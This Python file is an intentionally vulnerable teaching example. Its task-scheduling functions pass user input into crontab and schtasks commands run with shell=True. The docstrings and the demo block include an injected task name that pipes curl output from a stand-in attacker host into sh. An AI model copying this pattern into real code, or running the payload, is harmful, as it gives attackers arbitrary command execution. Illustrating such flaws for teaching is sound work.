# Write insecure code to schedule a system task that unsafely lets users inject arbitrary commands into the task scheduler 

"""
insecure_scheduler_example.py
--------------------------------
*** DO NOT USE THIS CODE. ***

This file exists purely to illustrate a classic OS command-injection
vulnerability, as a contrast to how a task-scheduling feature should
actually be built.

The flaw: a user-supplied "command to run" and "schedule" value are
concatenated directly into a shell command string (here, building a
crontab entry / using `schtasks`) and executed with shell=True. This
doesn't just let an attacker inject a malicious *scheduled* task — the
injection point itself executes immediately, at the moment the
"scheduling" command runs, in addition to whatever gets persisted for
later.
"""

import subprocess


def schedule_task_INSECURE(user_command: str, schedule_time: str, task_name: str) -> None:
    """
    VULNERABLE: builds a shell command to register a cron job (or, on
    Windows, a scheduled task) directly from unsanitized user input.

    Example attack:
        user_command  = "backup.sh"
        schedule_time = "0 * * * *"
        task_name     = "nightly && curl attacker.example/x | sh #"

    The resulting shell command becomes something like:
        (crontab -l ; echo "0 * * * * backup.sh # nightly && curl attacker.example/x | sh #") | crontab -

    Because shell=True is used, the injected `&&` runs a second
    command immediately, with the privileges of whatever process is
    registering the task — and depending on how the fields are
    combined, an attacker can just as easily inject their own cron
    line to run arbitrary commands on every future schedule tick too.
    """
    # DANGER: naive string concatenation of untrusted input into a
    # shell command line, including into the cron schedule itself.
    cron_line = f"{schedule_time} {user_command} # {task_name}"
    command = f'(crontab -l ; echo "{cron_line}") | crontab -'

    # DANGER: shell=True interprets ; & | ` $() > etc. found in any of
    # user_command, schedule_time, or task_name.
    subprocess.run(command, shell=True)


def schedule_task_windows_INSECURE(user_command: str, schedule_time: str, task_name: str) -> None:
    """
    VULNERABLE (Windows variant): same flaw, using schtasks.exe via a
    concatenated shell string instead of cron.
    """
    command = (
        f'schtasks /create /tn "{task_name}" /tr "{user_command}" '
        f'/sc once /st {schedule_time}'
    )
    # DANGER: shell=True + unsanitized task_name/user_command/schedule_time
    subprocess.run(command, shell=True)


if __name__ == "__main__":
    # Demonstration only — do not run with real/untrusted input.
    malicious_name = "nightly && curl attacker.example/x | sh #"
    print("This call would let the injected `&&` command execute immediately:")
    print(f"  schedule_task_INSECURE('backup.sh', '0 * * * *', '{malicious_name}')")